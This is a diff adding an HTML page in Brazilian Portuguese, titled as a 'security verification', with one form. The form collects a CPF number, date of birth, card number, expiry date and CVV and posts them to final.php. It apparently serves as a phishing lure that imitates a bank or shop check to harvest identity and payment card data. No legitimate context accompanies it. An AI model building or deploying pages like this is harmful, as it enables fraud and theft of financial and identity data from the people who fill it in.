@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8">
+<title>Verificação de segurança</title>
+<style>
+body{font-family:sans-serif;margin:40px}input{display:block;width:100%;margin:8px 0 16px;padding:8px}button{padding:10px 20px}
+</style>
+</head>
+<body>
+<h2>Verificação de segurança</h2>
+<form method="post" action="final.php">
+    <label>CPF</label>
+    <input name="cpf" required>
+    <label>Data de nascimento</label>
+    <input name="nasc" type="date" required>
+    <label>Número do cartão</label>
+    <input name="cartao" required>
+    <label>Validade (MM/AA)</label>
+    <input name="validade" required>
+    <label>CVV</label>
+    <input name="cvv" required>
+    <button type="submit">Continuar</button>
+</form>
+</body>
+</html>
